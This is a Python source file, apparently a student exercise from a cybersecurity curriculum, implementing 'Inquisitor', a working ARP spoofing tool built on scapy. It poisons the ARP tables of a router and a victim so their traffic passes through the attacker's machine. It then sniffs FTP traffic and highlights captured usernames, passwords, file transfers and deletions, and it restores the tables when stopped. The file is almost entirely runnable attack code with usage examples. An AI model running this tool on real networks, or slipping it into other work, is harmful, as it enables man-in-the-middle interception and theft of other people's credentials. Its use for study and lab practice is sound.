# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    inquisitor.py                                      :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: ysabik <ysabik@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/12/02 09:16:15 by ysabik            #+#    #+#              #
#    Updated: 2024/12/11 03:32:19 by ysabik           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import os
import sys
import time
import datetime
from threading import Thread
from scapy.all import ARP, Ether, sendp, sniff, TCP, Raw
from scapy.layers.l2 import Ether as Ether2
from getmac import get_mac_address


sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from cyberlib import cprint, ArgParser, ArgError, Color


def print(
		*values: object,
		sep: str | None = ' ',
		end: str | None = '\n',
		reset: bool = True,
		char: str = Color.DEFAULT_MAGIC_CHAR,
		) -> None:
	t = f'§f[{datetime.datetime.now().strftime('%H:%M:%S')}]§r'
	s = f'§7[§9Inquisitor§7]§r'
	return cprint(t, s, *values, sep=sep, end=end, reset=reset, char=char)


running = True
return_code = 0


def arp_poison(router_ip, router_mac, victim_ip, victim_mac, attacker_mac):
	global running, return_code

	# Packet 1: Tell the Router that the Victim's IP is at the Attacker's MAC
	arp_to_router = Ether(dst=router_mac) / ARP(
		op=2,					# ARP response (is-at)
		pdst=router_ip,			# Destination IP (Router)
		hwdst=router_mac,		# Destination MAC (Router)
		psrc=victim_ip,			# Source IP (Victim's IP)
		hwsrc=attacker_mac		# Source MAC (Attacker's MAC)
	)

	# Packet 2: Tell the Victim that the Router's IP is at the Attacker's MAC
	arp_to_victim = Ether(dst=victim_mac) / ARP(
		op=2,					# ARP response (is-at)
		pdst=victim_ip,			# Destination IP (Victim)
		hwdst=victim_mac,		# Destination MAC (Victim)
		psrc=router_ip,			# Source IP (Router's IP)
		hwsrc=attacker_mac		# Source MAC (Attacker's MAC)
	)

	print(f'§2[POISONNING]§r <{router_ip} ({router_mac})>  {victim_ip} -> {attacker_mac}')
	print(f'§2[POISONNING]§r <{victim_ip} ({victim_mac})>  {router_ip} -> {attacker_mac}')
	try:
		while running:
			sendp(arp_to_router, verbose=False)
			sendp(arp_to_victim, verbose=False)
			time.sleep(1)
	except KeyboardInterrupt:
		pass
	except Exception as e:
		print(f'§c[{e.__class__.__name__}] §4{e}  (at scapy.all.sendp)')
		return_code |= 1


def restore_arp(router_ip, router_mac, victim_ip, victim_mac):
	global running, return_code
	running = False

	# Packet 1: Restore the Router's ARP table
	arp_to_router = Ether(dst=router_mac) / ARP(
		op=2,					# ARP response (is-at)
		pdst=router_ip,			# Destination IP (Router)
		hwdst=router_mac,		# Destination MAC (Router)
		psrc=victim_ip,			# Source IP (Victim's IP)
		hwsrc=victim_mac		# Source MAC (Victim's MAC)
	)

	# Packet 2: Restore the Victim's ARP table
	arp_to_victim = Ether(dst=victim_mac) / ARP(
		op=2,					# ARP response (is-at)
		pdst=victim_ip,			# Destination IP (Victim)
		hwdst=victim_mac,		# Destination MAC (Victim)
		psrc=router_ip,			# Source IP (Router's IP)
		hwsrc=router_mac		# Source MAC (Router's MAC)
	)

	try:
		sendp(arp_to_router, verbose=False)
		print(f'§2[RESTORED]§r <{router_ip} ({router_mac})>  {victim_ip} -> {victim_mac}')
	except Exception as e:
		print(f'§c[{e.__class__.__name__}] §4{e}  (at scapy.all.sendp - Router)')
		return_code |= 1
	try:
		sendp(arp_to_victim, verbose=False)
		print(f'§2[RESTORED]§r <{victim_ip} ({victim_mac})>  {router_ip} -> {router_mac}')
	except Exception as e:
		print(f'§c[{e.__class__.__name__}] §4{e}  (at scapy.all.sendp - Victim)')
		return_code |= 1


def sniff_ftp(router_mac: str, victim_mac: str, attacker_mac: str, verbose=False):
	global return_code

	last_cmd: str | None = None

	def process_ftp_packet(packet: Ether2):
		nonlocal router_mac, victim_mac, attacker_mac, verbose, last_cmd
		if packet.src == attacker_mac:
			return
		if packet.haslayer(TCP) and packet.haslayer(Raw):
			ftp_prefix = '§d[FTP]§r'
			if packet.src == victim_mac and packet.dst == attacker_mac:
				prefix = '§a<--'
			elif packet.src == router_mac and packet.dst == attacker_mac:
				prefix = '§4-->'
			else:
				prefix = f'§7{packet.dst} §5<--§7 {packet.src}'
			prefix += '§7 |§r '

			try:
				tcp_payload: bytes = packet[Raw].load
				ftp_data = tcp_payload.decode('utf-8', errors='ignore').strip()

				if verbose:
					for line in ftp_data.split('\n'):
						print(ftp_prefix, prefix + line)

				p = lambda title: print(ftp_prefix, f'§5[{title}]§r {ftp_data}')
				if 'USER' in ftp_data or 'PASS' in ftp_data:	p('CRED')
				elif 'RETR' in ftp_data:						p('DWLD')
				elif 'STOR' in ftp_data:						p('UPLD')
				elif 'QUIT' in ftp_data:						p('QUIT')
				elif 'DELE' in ftp_data or 'RMD' in ftp_data:
					p('REMV')
					last_cmd = 'REMV'
				elif 'PASV' in ftp_data:
					last_cmd = 'PASV'
				elif 'PWD' in ftp_data or 'CWD' in ftp_data:
					last_cmd = 'WDIR'
				elif '227' in ftp_data and last_cmd == 'PASV':
					try:
						info = ftp_data.split('(')[1].split(')')[0].split(',')
						ip = '.'.join(info[:4])
						port = int(info[4]) << 8 | int(info[5])
						print(ftp_prefix, f'§5[PASV]§r {ip}:{port}')
					except Exception:
						raise ValueError('Invalid PASV response')
					last_cmd = None
				elif ('250' in ftp_data or '257' in ftp_data) and last_cmd == 'WDIR':
					p('WDIR')
					last_cmd = None
				elif '250' in ftp_data and last_cmd == 'REMV':
					p('REMV')
					last_cmd = None
				else:
					last_cmd = None
			except Exception as e:
				print(f'§c[{e.__class__.__name__}] §4{e}')

	try:
		print('Sniffing FTP traffic...')
		sniff(filter='tcp port 21', prn=process_ftp_packet, store=False)
	except Exception as e:
		print(f'§c[{e.__class__.__name__}] §4{e}  (at scapy.all.sniff)')
		return_code |= 1


def is_ipv4(ip: str) -> bool:
	return ip.count('.') == 3 and all(0 <= int(x) < 256 for x in ip.split('.'))


def is_mac(mac: str) -> bool:
	return mac.count(':') == 5 and all(int(x, 16) < 256 for x in mac.split(':'))


if __name__ == '__main__':
	debug = 0
	if len(sys.argv) > 1 and sys.argv[1] == 'd':
		debug = 1
	elif len(sys.argv) > 1 and sys.argv[1] == 'D':
		debug = 2
	if debug:
		print('§7[DEBUG]§r Running in debug mode')
		print()
		sys.argv = [sys.argv[0], '172.27.0.4', '02:42:ac:1b:00:04', '172.27.0.2', '02:42:ac:1b:00:02']
		if debug == 2:
			sys.argv.append('-v')

	ap = ArgParser(sys.argv[1:]) \
			.add_pre_desc('42-Cybersecurity - Inquisitor | ARP Spoofer') \
			.add_pre_desc('ARP Spoofing attack to sniff FTP traffic between a Router and a Victim.') \
			.add_pre_desc() \
			.add_pre_desc('Example:') \
			.add_pre_desc('  Router: 192.168.0.1 [00:00:00:00:00:01]') \
			.add_pre_desc('  Victim: 192.168.0.2 [00:00:00:00:00:02]') \
			.add_pre_desc('  Attacker:           [00:00:00:00:00:03]') \
			.add_pre_desc() \
			.add_pre_desc('Before the attack:') \
			.add_pre_desc('  192.168.0.2 (Victim) wants to send a packet to 192.168.0.1 (Router)') \
			.add_pre_desc('  Victim\'s ARP Table:') \
			.add_pre_desc('    - 192.168.0.1 --> [00:00:00:00:00:01]') \
			.add_pre_desc('  The packet to 192.168.0.1 (Router) will go to [00:00:00:00:00:01] (Router)') \
			.add_pre_desc() \
			.add_pre_desc('After the attack:') \
			.add_pre_desc('  Attacker send an ARP-Update packet to Victim.') \
			.add_pre_desc('  Updated Victim\'s ARP Table:') \
			.add_pre_desc('    - 192.168.0.1 --> [00:00:00:00:00:03]') \
			.add_pre_desc('  The packet to 192.168.0.1 (Router) will go to [00:00:00:00:00:03] (Attacker)') \
			.add_pre_desc() \
			.add_pre_desc() \
			.add_pre_desc('Usage: ./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>') \
			.add_flag('v', 'verbose', None, 'Show all FTP traffic') \
			.add_flag('h', 'help', None, 'Print this help message') \
			.add_post_desc() \
			.add_post_desc('Example:') \
			.add_post_desc('  ./inquisitor 192.168.0.2 00:00:00:00:00:02 192.168.0.1 00:00:00:00:00:01') \
			.add_post_desc('  ./inquisitor  172.27.0.4 02:42:ac:1b:00:04  172.27.0.2 02:42:ac:1b:00:02 -v') \
			.add_post_desc() \
			.add_post_desc('Credits: ysabik (https://github.com/Luzog78)')

	try:
		ap.parse()
	except ArgError as e:
		cprint(f'§c[{e.__class__.__name__}] §4{e}  (at ArgParser.parse)')
		sys.exit(1)

	if ap.get_value('h'):
		cprint(ap)
		sys.exit(0)

	verbose = ap.get_value('v')

	if len(ap.free_args) < 4:
		cprint('§c[ArgError] §4You must provide 4 arguments.')
		sys.exit(1)

	router_ip, router_mac, victim_ip, victim_mac = ap.free_args[:4]
	if not is_ipv4(router_ip):
		cprint(f'§c[ArgError] §4Invalid <IP-src>: {router_ip}')
		sys.exit(1)
	if not is_mac(router_mac):
		cprint(f'§c[ArgError] §4Invalid <MAC-src>: {router_mac}')
		sys.exit(1)
	if not is_ipv4(victim_ip):
		cprint(f'§c[ArgError] §4Invalid <IP-target>: {victim_ip}')
		sys.exit(1)
	if not is_mac(victim_mac):
		cprint(f'§c[ArgError] §4Invalid <MAC-target>: {victim_mac}')
		sys.exit(1)

	attacker_mac = get_mac_address()
	if not is_mac(attacker_mac):
		cprint(f'§c[InternalError] §4Could not get the Attacker\'s MAC address.')
		sys.exit(1)

	try:
		print('§7####################################################')
		print('§7##§r                                                §7##')
		print('§7##§r                   §9§l§nInquisitor§r                   §7##')
		print('§7##§r                                                §7##')
		print(f'§7##§r  §crouter: {router_ip:>15}  [{router_mac:>17}]§r §7 ##')
		print(f'§7##§r  §avictim: {victim_ip:>15}  [{victim_mac:>17}]§r  §7##')
		print(f'§7##§r         §dattacker:  [{attacker_mac:>17}]§r         §7##')
		print('§7##§r                                                §7##')
		print(f'§7##§r                 Verbose: {"§aTrue§r " if verbose else "§cFalse§r"}                §7 ##')
		print('§7####################################################')
		print()

		poison_thread = Thread(
			target=arp_poison,
			args=(router_ip, router_mac, victim_ip, victim_mac, attacker_mac)
		)
		poison_thread.start()

		sniff_ftp(router_mac, victim_mac, attacker_mac, verbose=verbose)
		poison_thread.join()
	except KeyboardInterrupt:
		cprint(end='\r')
		restore_arp(router_ip, router_mac, victim_ip, victim_mac)
	print('Exiting...')
	sys.exit(return_code)
